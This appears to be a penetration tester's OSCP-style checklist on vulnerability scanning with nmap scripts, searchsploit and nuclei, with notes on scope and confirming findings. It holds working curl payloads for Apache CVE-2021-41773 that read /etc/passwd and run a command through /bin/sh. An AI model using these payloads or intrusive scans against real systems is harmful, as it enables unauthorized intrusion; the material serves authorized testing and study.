# Vulnerability scanning

## Nmap's vuln scripts on the ports I found
THE-PORTS is the open ports from the full scan, such as 21,22,80,445.
sudo nmap -sV -p THE-PORTS --script vuln <TargetIP> -oN vuln.nmap
- [ ] Never with -p-: it is slow and loud, and some checks are intrusive
- [ ] A clean result proves little: it covers a thin slice of known CVEs

## Targeted checks
sudo nmap -p 445 --script smb-vuln-ms17-010 <TargetIP>
sudo nmap -p 445 --script smb2-security-mode <TargetIP>
sudo nmap -p <Port> --script ssl-heartbleed <TargetIP>
sudo nmap -p <Port> --script http-shellshock --script-args uri=/cgi-bin/THE-SCRIPT <TargetIP>
- [ ] ms17-010 VULNERABLE: EternalBlue, on an old Windows with SMBv1
- [ ] Signing enabled but not required: a candidate for NTLM relay
- [ ] Shellshock needs a real CGI script's name: from a directory scan of /cgi-bin/

## Confirm a finding by hand
Apache 2.4.49, CVE-2021-41773, a file read:
curl -s --path-as-is '<Scheme>://<WebHost>/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
And with CGI on, a command:
curl -s --path-as-is -d 'echo;id' '<Scheme>://<WebHost>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
- [ ] Every scanner finding confirmed like this before I count it

## Versions to exploits
Every open port's version, from the deep scan in :Pb ports:
searchsploit --nmap deep_tcp.xml
searchsploit -m <EdbID>
- [ ] Each exploit read before I run it, with its target version checked

## Nuclei on each web service
nuclei -update-templates
nuclei -u <Scheme>://<WebHost> -as -o nuclei.txt
By tag and severity:
nuclei -u <Scheme>://<WebHost> -tags cve,exposure,misconfig -s critical,high,medium,low -o nuclei-tags.txt
Logged in, with the session cookie:
nuclei -u <Scheme>://<WebHost> -as -H 'Cookie: THE-COOKIE' -o nuclei-auth.txt
Many web services at once, one URL a line:
nuclei -l urls.txt -as -o nuclei-all.txt
- [ ] A fragile target: -rl 20 holds it to 20 requests a second
- [ ] Not on the OSCP exam, and fuzz or intrusive templates only where they are in scope
- [ ] Every finding confirmed by hand, then the web checklist: :Pb web
